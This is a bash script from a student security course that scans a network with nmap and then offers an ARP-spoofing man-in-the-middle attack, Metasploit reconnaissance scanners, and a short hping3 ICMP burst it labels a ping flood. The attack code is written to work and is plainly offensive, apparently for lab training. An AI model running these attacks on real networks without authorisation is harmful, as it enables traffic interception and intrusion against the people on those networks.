#!/bin/bash

# Student Name: May Hazon
# Class Code: S5
# Unit: TMagen773632
# Lecturer: Erel

# Define the home directory and log file location
HOME=$(pwd)
LOG_FILE="/var/log/attack_log.txt"

# Checks if the user is root, exits if not.
function WHO_USER()
{
	user=$(whoami)
	echo -e "\e[36m[ ! ] First Checking if you are root [ ! ]\e[0m\n"
	sleep 1
	if [ "$user" == "root" ]
	then
		echo -e "\e[32mYou are root.. continuing..\e[0m"
	else
		echo -e "\e[31mYou are not root.. exiting...\e[0m\n"
		exit
	fi
	IP_SECTION
}

# Logs the attack type, target IP, and timestamp.
function LOG_ATTACK()
{
    local attack_type=$1
    local target_ip=$2
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    echo "$timestamp - Attack: $attack_type - Target: $target_ip" | sudo tee -a "$LOG_FILE" > /dev/null
    echo -e "\e[32m[ ✓ ] Attack logged in $LOG_FILE\e[0m"
}

# Displays the attack selection menu and logs the chosen attack.
function ATTACK_SELECTION() 
{
    while true; do
        sleep 1
        echo "---------------------------------"
        echo -e "Attack Selection Menu"
		echo "---------------------------------"
		echo -e "\e[36mPlease choose an attack method:\e[0m\n"

		echo -e "1) Ping Flood Attack (hping3)"
		echo -e "\e[36mDescription:\e[0m A Ping Flood Attack sends a high volume of ICMP echo requests (ping packets) to the target. 
		This can overwhelm the target's network connection, causing denial of service (DoS) by consuming all available bandwidth."

		echo ""

		echo -e "2) Metasploit Attack"
		echo -e "\e[36mDescription:\e[0m A Metasploit Attack utilizes the Metasploit Framework to identify vulnerabilities, 
		gather information, and test security defenses on the target system. It scans open ports, services, and versions 
		to find potential weaknesses for further exploitation."

		echo ""

		echo -e "3) ARP Spoofing Attack (arpspoof)"
		echo -e "\e[36mDescription:\e[0m ARP Spoofing tricks devices on a network into sending data to the attacker 
		instead of the intended recipient. By sending fake ARP messages, the attacker can intercept, monitor, 
		or alter the communication between devices, enabling a Man-in-the-Middle attack."


		echo ""

		echo -e "4) Exit"


        echo ""
        sleep 1
        echo -e "\e[36m\nEnter your choice (1, 2, 3, or 4): \e[0m"
        read attack_choice

        case $attack_choice in
            1)
                echo -e "\e[32mYou selected: Ping Flood Attack\e[0m\n"
                dpkg -s "hping3" >/dev/null 2>&1 || sudo apt-get install "hping3" -y >/dev/null 2>&1
                echo -e "All available IP addresses on the network:"
				echo "$filtered_ip_list"
                read -p "Enter target IP address: " target_ip
                PING_ATTACK "$target_ip"
                LOG_ATTACK "Ping Flood Attack" "$target_ip"
                ;;
            2)
                echo -e "\e[32mYou selected: Metasploit Attack\e[0m\n"
                dpkg -s "metasploit-framework" >/dev/null 2>&1 || sudo apt-get install "metasploit-framework" -y >/dev/null 2>&1
                echo -e "All available IP addresses on the network:"
				echo "$filtered_ip_list"
                read -p "Enter target IP address: " target_ip
                METASPLOIT_ATTACK "$target_ip"
                LOG_ATTACK "Metasploit Attack" "$target_ip"
                ;;
            3)
                echo -e "\e[32mYou selected: ARP Spoofing Attack\e[0m\n"
                (dpkg -s "arpspoof" >/dev/null 2>&1 || sudo apt-get install "dsniff" -y >/dev/null 2>&1) && (dpkg -s "xterm" >/dev/null 2>&1 || sudo apt-get install "xterm" -y >/dev/null 2>&1)
                echo -e "All available IP addresses on the network:"
				echo "$filtered_ip_list"
                read -p "Enter target IP address: " target_ip
                read -p "Enter gateway IP address: " gateway_ip
                ARP_ATTACK "$target_ip" "$gateway_ip"
                LOG_ATTACK "ARP Spoofing Attack" "$target_ip"
                ;;
            4)
                echo "Exiting..."
                exit 0
                ;;
            *)
                echo -e "\e[31mInvalid choice. Please try again.\e[0m"
                ;;
        esac
    done
}

# Asks for a CIDR network range and validates the input.
function IP_SECTION()
{
	local regex='^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$'
	while true 
	do
	echo -e "\n\e[36m[ + ] Please provide me the network range you would like to scan in CIDR format (e.g., 192.168.1.0/24):\e[0m\n"
	read range
	if [[ $range =~ $regex ]]
	then
		echo -e "\n\e[32m[ ✓ ] Great! You provided a valid CIDR range: $range [ ✓ ]\e[0m\n"
		break
	else
		echo -e "\n\e[31mNo, this is not a valid CIDR format. Please try again.\e[0m\n"
	fi
	done
	SCANNING
}

# Scans the network range and displays available IPs.
function SCANNING()
{
	echo -e "\e[36mInstall the nmap tool if needed and scanning the network...\e[0m\n"
	dpkg -s "nmap" >/dev/null 2>&1 || sudo apt-get install "nmap" -y >/dev/null 2>&1
	nmap $range -sV --min-rate=1000 > $HOME/range_ip.txt
	ip_list=$(cat $HOME/range_ip.txt | awk '/Nmap scan report/{print $NF}')
    vmware_ips=$(arp -a | grep '00:50:56' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
    my_ip=$(ifconfig | grep -w inet | awk '{print $2}')
    default_gw=$(route -n | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
    filtered_ip_list=$(echo "$ip_list" | grep -v -x -e "$my_ip" -e "$default_gw" -e "$vmware_ips")
    
    echo -e "All available IP addresses on the network:"
	echo "$filtered_ip_list"
	if [ -z "$filtered_ip_list" ]; then
        echo -e "\n\e[31mNo available IP addresses found in the provided range.\e[0m"
        IP_SECTION
    fi
	
}

# Executes a Ping attack using hping3.
function PING_ATTACK()
{
	local target_ip=$1
	echo -e "\n\e[36mStarting Ping attack on $target_ip...\e[0m\n"
    sudo hping3 -1 -c 10 "$target_ip"
    echo -e "\n\e[32mPing Attack on $target_ip completed.\e[0m\n"
    sleep 1
}

# Runs a Metasploit scan to gather information or find vulnerabilities.
function METASPLOIT_ATTACK()
{
	local target_ip=$1
	echo -e "\n\e[36mStarting Metasploit scan on $target_ip...\e[0m\n"
    echo "Select an information gathering module:"
    echo "1) SMB Version Scan"
    echo "2) NetBIOS Name Scan"
    echo "3) FTP Anonymous Login Check"
    echo "4) HTTP Title Banner Grab"
    echo "5) SNMP Information Gathering"
    echo "6) SSH Version Scan"
    echo "7) Telnet Version Scan"
    echo "8) VNC Authentication Check"
    echo "9) MySQL Version Detection"
    echo "10) Exit"

    echo ""
    read -p "Enter your choice (1-10): " scan_choice

    case $scan_choice in
        1) module="auxiliary/scanner/smb/smb_version" ;;
        2) module="auxiliary/scanner/netbios/nbname" ;;
        3) module="auxiliary/scanner/ftp/anonymous" ;;
        4) module="auxiliary/scanner/http/http_title" ;;
        5) module="auxiliary/scanner/snmp/snmp_enum" ;;
        6) module="auxiliary/scanner/ssh/ssh_version" ;;
        7) module="auxiliary/scanner/telnet/telnet_version" ;;
        8) module="auxiliary/scanner/vnc/vnc_none_auth" ;;
        9) module="auxiliary/scanner/mysql/mysql_version" ;;
        10) echo "Returning to main menu..."; return ;;
        *) echo -e "\e[31mInvalid choice. Returning to main menu.\e[0m"; return ;;
    esac

    echo -e "\nRunning Metasploit scan: $module on $target_ip, it might take a few moments..."
    msfconsole -q -x "use $module; set RHOSTS $target_ip; run; exit"
    sleep 3
}

# Enable IP Forwarding for MITM
function ENABLE_IP_FORWARDING() 
{
    echo -e "Enabling IP Forwarding...\n"
    sudo sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
    echo -e "\e[32mIP Forwarding Enabled.\e[0m"
}

# Disable IP Forwarding after MITM
function DISABLE_IP_FORWARDING() 
{
    echo -e "Disabling IP Forwarding...\n"
    sudo sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1
    echo -e "\e[32mIP Forwarding Disabled.\e[0m"
}

# Performs an ARP Spoofing attack to intercept network traffic.
function ARP_ATTACK()
{
	local target_ip=$1
	local gateway_ip=$2
	inter_face=$(ip route | grep default | awk '{print $5}')
	echo -e "\n\e[36mStarting ARP Spoofing Attack on $target_ip via $gateway_ip using interface $interface...\e[0m\n"
	ENABLE_IP_FORWARDING
	
	xterm -hold -e "sudo arpspoof -i $inter_face -t $target_ip -r $gateway_ip" &
	xterm -hold -e "sudo arpspoof -i $inter_face -t $gateway_ip -r $target_ip" &

	
	echo -e "\n\e[32mMITM Attack in progress... Press any key to stop.\e[0m"
    read -n 1 -s
    echo -e "\n\e[36mStopping ARP Spoofing Attack...\e[0m\n"
    sudo killall arpspoof
    DISABLE_IP_FORWARDING
    echo -e "\n\e[32mMITM Attack stopped.\e[0m\n"
	sleep 2
}

WHO_USER
ATTACK_SELECTION
